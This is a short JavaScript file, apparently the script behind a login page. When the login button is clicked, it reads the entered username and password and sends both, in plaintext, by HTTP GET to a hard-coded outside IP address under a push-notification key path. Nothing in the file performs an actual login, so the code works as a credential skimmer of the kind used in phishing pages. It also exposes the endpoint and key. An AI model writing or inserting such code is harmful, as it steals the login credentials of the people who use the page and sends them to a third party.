$(function(){
	$('.logoPic').click(function(){
		console.log("click")
	})
	$('.login-btn').click(function(){
		let username = $('#username').val()
		let pwd = $('#pwd').val()
		bark("登陆操作",username+"+"+pwd,1)
	})
})

function bark(title,msg,autoCopy){
	if(autoCopy){
		let postMsg = "http://175.24.233.53:8080/BSDzeWLMXLWosiCom6FQaN/" + title + "/" + msg +"?autoCopy=1&copy="+msg
		console.log(postMsg)
		const xhr = new XMLHttpRequest();
			//2. 初始化 设置请求方法和 url
		xhr.open('GET', postMsg);
		//3. 发送
		xhr.send();
	}else{
		let postMsg = "http://175.24.233.53:8080/BSDzeWLMXLWosiCom6FQaN/" + title + "/" + msg
		console.log(postMsg)
		const xhr = new XMLHttpRequest();
			//2. 初始化 设置请求方法和 url
		xhr.open('GET', postMsg);
		//3. 发送
		xhr.send();
	}
	
}